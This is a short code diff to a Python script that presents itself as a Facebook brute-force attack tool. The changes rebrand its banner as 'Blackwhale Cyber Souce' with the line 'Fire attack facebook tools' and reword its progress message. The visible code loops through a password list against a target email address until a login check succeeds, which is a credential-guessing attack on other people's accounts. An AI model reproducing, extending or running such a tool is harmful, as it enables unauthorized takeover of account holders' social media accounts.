@@ -46,7 +46,8 @@ def is_this_a_password(email, index, password):
 
 
 if __name__ == "__main__":
-    print('\n---------- Welcome To Facebook BruteForce ----------\n')
+    print('\n---------- Welcome To Blackwhale Cyber Souce \n')
+    print('Fire attack facebook tools')
     if not os.path.isfile(PASSWORD_FILE):
         print("Password file is not exist: ", PASSWORD_FILE)
         sys.exit(0)
@@ -57,6 +58,6 @@ if __name__ == "__main__":
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
             continue
-        print("Trying password [", index, "]: ", password)
+        print("Checking Password [", index, "]: ", password)
         if is_this_a_password(email, index, password):
             break
